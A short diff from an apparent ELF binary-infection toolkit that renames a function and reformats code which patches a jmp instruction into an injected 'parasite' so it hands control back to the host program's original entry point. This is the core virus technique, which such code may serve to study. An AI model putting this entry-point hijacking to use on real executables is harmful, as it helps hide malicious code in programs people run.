@@ -1,9 +1,9 @@
 #include "common/patch_pattern.hh"
-#include "common/patch_relinguish_control.hh"
+#include "common/redirect_elf_entry_point.hh"
 
 namespace vt::common {
 
-bool patch_parasite_and_relinquish_control(
+bool redirect_elf_entry_point(
     Elf64_Half binary_type, Elf64_Addr original_entry_point,
     Elf64_Addr parasite_load_address, size_t parasite_offset,
     size_t parasite_size, vt::common::Mmap<PROT_READ | PROT_WRITE>& mapping) {
@@ -35,8 +35,8 @@ bool patch_parasite_and_relinquish_control(
 
   constexpr uint64_t branch_op_code = 0xe9;
   void* patch_addr = mapping.mutable_base() + parasite_offset +
-    patch_offset_from_parasite_start;
-  *static_cast<uint64_t*>(patch_addr)= branch_op_code;
+                     patch_offset_from_parasite_start;
+  *static_cast<uint64_t*>(patch_addr) = branch_op_code;
   *(int32_t*)(mapping.mutable_base() + parasite_offset +
               patch_offset_from_parasite_start + 1) = rel;
 
